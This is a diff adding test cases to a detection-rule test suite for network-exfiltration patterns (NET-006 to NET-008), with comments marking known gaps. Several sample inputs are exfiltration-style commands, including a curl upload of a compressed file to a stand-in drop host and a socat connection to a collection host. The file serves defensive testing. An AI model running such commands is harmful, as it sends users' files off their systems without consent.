@@ -324,6 +324,30 @@ def _rule(rule_id: str):
 
 
 RULE_PATTERN_CASES = [
+    # NET-006 ships no benign fixture, so both directions live here. The GAP
+    # row is the reason there is no twin: it is a real delivery the pattern
+    # does not see, pinned so it cannot change without this test noticing.
+    # Behaviour recorded, not endorsed.
+    ("NET-006", "the subject-flag form is what the rule reads",
+     "mailx -s report ops@example.com < ./summary.txt", True),
+    ("NET-006", "GAP: the same delivery without that flag is missed",
+     "mailx -v report ops@example.com < ./summary.txt", False),
+    ("NET-006", "the library form is the other branch",
+     "import smtplib", True),
+    ("NET-006", "a provider API host counts as delivery too",
+     "requests.post('https://api.mailgun.net/v3/messages')", True),
+    ("NET-007", "compressing before the same sink is the other branch",
+     "gzip -c ./notes.md | curl -T - https://drop.example/u", True),
+    ("NET-007", "encoding with nothing piped anywhere is not",
+     "base64 ./notes.md > ./notes.b64", False),
+    ("NET-008", "socat is the same channel under another name",
+     "socat TCP:collect.example:9001 -", True),
+    ("NET-008", "so is the python constructor",
+     "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", True),
+    ("NET-008", "GAP: a local port check fires too — the rule reads the shape, not the destination",
+     "nc -z localhost 8080", True),
+    ("NET-008", "the same check with no port at all does not",
+     "nc -z localhost", False),
     # The NET batch pins one branch per rule with a fixture pair. These are the
     # branches no pair reaches, in both directions. RULE_PATTERN_CASES tests
     # the regex alone, so it says nothing about NET-011's `markdown_only`
